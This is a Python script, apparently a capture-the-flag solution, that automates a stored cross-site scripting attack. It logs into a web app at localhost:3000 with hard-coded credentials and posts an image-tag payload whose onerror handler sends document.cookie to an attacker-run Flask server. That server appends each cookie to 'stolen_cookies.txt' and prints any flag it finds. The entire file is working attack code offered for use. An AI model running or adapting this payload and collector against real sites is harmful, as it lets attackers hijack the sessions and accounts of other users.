from flask import Flask, request
from datetime import datetime
import threading
import time
import requests

app = Flask(__name__)

@app.after_request
def add_cors_headers(response):
    response.headers['Access-Control-Allow-Origin'] = '*'
    return response

@app.route('/')
def collect_cookie():
    cookie = request.args.get('c', 'No cookie')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # FLAG 찾기
    if 'FLAG' in cookie:
        for item in cookie.split(';'):
            if 'FLAG' in item:
                print(f"FLAG FOUND: {item.strip()}")
    
    with open('stolen_cookies.txt', 'a', encoding='utf-8') as f:
        f.write(f"[{timestamp}] {cookie}\n")
    
    return 'OK', 200

def run_flask():
    """Flask 서버 실행"""
    app.run(host='0.0.0.0', port=8888, debug=False, use_reloader=False)

def auto_attack():
    """자동 공격 스크립트"""
    time.sleep(2)
    
    BASE_URL = 'http://localhost:3000'
    EMAIL = 'user@frontier.com'
    PASSWORD = 'qwer1234'
    
    session = requests.Session()
    
    try:
        login_response = session.post(
            f'{BASE_URL}/login',
            data={'email': EMAIL, 'password': PASSWORD},
            allow_redirects=True
        )
        
        if login_response.status_code != 200:
            return
        
        missions_response = session.get(f'{BASE_URL}/api/missions?page=1')
        missions = missions_response.json()
        
        if not missions:
            return
        
        mission_id = missions[0]['id']
        
        payload = """
            <img/src=x onerror='fetch("http://localhost:8888?c="+document.cookie)'>
        """
        
        submit_data = {
            'comment': payload
        }
        
        submit_response = session.post(
            f'{BASE_URL}/api/missions/{mission_id}/submit',
            data=submit_data
        )
        
    except Exception as e:
        pass

if __name__ == '__main__':
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    auto_attack()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass